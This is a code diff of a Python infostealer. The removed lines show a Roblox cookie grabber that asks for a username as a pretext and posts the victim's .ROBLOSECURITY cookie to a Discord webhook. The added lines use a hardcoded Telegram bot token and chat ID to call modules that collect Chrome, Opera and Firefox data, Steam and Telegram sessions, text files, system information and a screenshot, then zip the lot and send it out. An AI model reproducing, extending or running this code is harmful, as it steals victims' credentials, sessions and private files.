@@ -1,24 +1,39 @@
-from discord_webhook import DiscordWebhook, DiscordEmbed
-import requests
-import threading
-import browser_cookie3 as cookie
-import time
-
-name = input('Enter your roblox username: ')
-
-webhookl = DiscordWebhook(url='https://discord.com/api/webhooks/1010031153144676434/8PDj8P32e4SW2qlQXyqi3HNm2NWNKlR6-MmkgZIbf1HSMR5d3DyziJLcHMGvrxILhPIP')
+TOKEN = '5806287866:AAF8GKG6fnAnvlB4aqOIyOGX6IgIH2fOAo4'
+CHAT_ID = '5487279848'
 
 
-def getCookiesFromPc():
-    req = requests.Session()
-    cj = cookie.chrome()
-    req.cookies = cj
-    r = req.get("https://www.roblox.com/")
-    for c in req.cookies:
-        if c.name == ".ROBLOSECURITY":
-            webhook = DiscordWebhook(url='https://discordapp.com/api/webhooks/1010031153144676434/8PDj8P32e4SW2qlQXyqi3HNm2NWNKlR6-MmkgZIbf1HSMR5d3DyziJLcHMGvrxILhPIP')
-            embed = DiscordEmbed(title='🍪 Новый куки файл!', description=f'{c.value}', color='03b2f8')
-            webhook.add_embed(embed)
-            response = webhook.execute()
 
-getCookiesFromPc()
+
+
+
+from modules.others import folder
+from modules.system import sys
+from modules.system import screen
+from modules.browsers import chrome
+from modules.browsers import opera
+from modules.browsers import firefox
+from modules.others import telegram
+from modules.others import sender
+from modules.others import makeitclean
+from modules.others import steam
+from modules.system import txt
+
+
+folder.makeFolders()
+chrome.Chrome()
+opera.Opera()
+firefox.Firefox()
+steam.Steam()
+sys.SystemInfo()
+txt.TxtSteal()
+telegram.Telegram()
+screen.Screenshot()
+
+try:
+    makeitclean.makemeZip()
+except Exception as e:
+    print(e)
+try:
+    sender.Send(TOKEN, CHAT_ID)
+except Exception as e:
+    print(e)
